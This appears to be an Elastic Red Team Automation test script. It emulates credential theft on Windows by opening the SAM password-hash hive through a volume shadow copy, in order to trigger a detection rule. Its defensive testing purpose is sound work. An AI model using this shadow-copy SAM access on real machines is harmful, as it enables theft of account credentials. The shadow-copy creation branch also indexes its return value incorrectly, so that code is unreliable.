# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata



metadata = RtaMetadata(
    uuid="b78f0255-3b97-4e39-8857-ec74d09e36ba",
    platforms=["windows"],
    siem=[],
    endpoint=[{'rule_id': 'dc27190a-688b-4f9b-88f0-1f13deccd67f', 'rule_name': 'Security Account Manager (SAM) File Access'}],
    techniques=['T1003', 'T1003.002'],
)

def get_vss_list():
    import win32com.client
    wcd = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    wmi = wcd.ConnectServer(".","root\cimv2")
    obj = wmi.ExecQuery("SELECT * FROM Win32_ShadowCopy")
    return [o.DeviceObject for o in obj]

def vss_create():
    import win32com.client
    wmi=win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy")
    createmethod = wmi.Methods_("Create")
    createparams = createmethod.InParameters
    createparams.Properties_[1].value="c:\\"
    results = wmi.ExecMethod_("Create", createparams)
    return results.Properties_[1].value

@common.requires_os(*metadata.platforms)
def main():
    import win32file
    vss_list = get_vss_list()
    if len(vss_list) > 0 :
       sam_path = f"{vss_list[0]}\\Windows\\System32\\config\\SAM"
       print(f'[+] - Attempting to Open {sam_path}')
       hf = win32file.CreateFile(sam_path, win32file.GENERIC_READ, 0, None, 3, 0, None)
       if (hf):
           print(f'[+] - RTA Done!')
           win32file.CloseHandle(hf)
       else :
           print(f'[x] - RTA Failed :(')

    else :
        vss_list = vss_create()
        sam_path = f"{vss_list[0]}\\Windows\\System32\\config\\SAM"
        hf = win32file.CreateFile(sam_path, win32file.GENERIC_READ, 0, None, 3, 0, None)
        if (hf):
            print(f'[+] - RTA Done!')
            win32file.CloseHandle(hf)
        else :
            print(f'[x] - RTA Failed :(')

if __name__ == "__main__":
    exit(main())
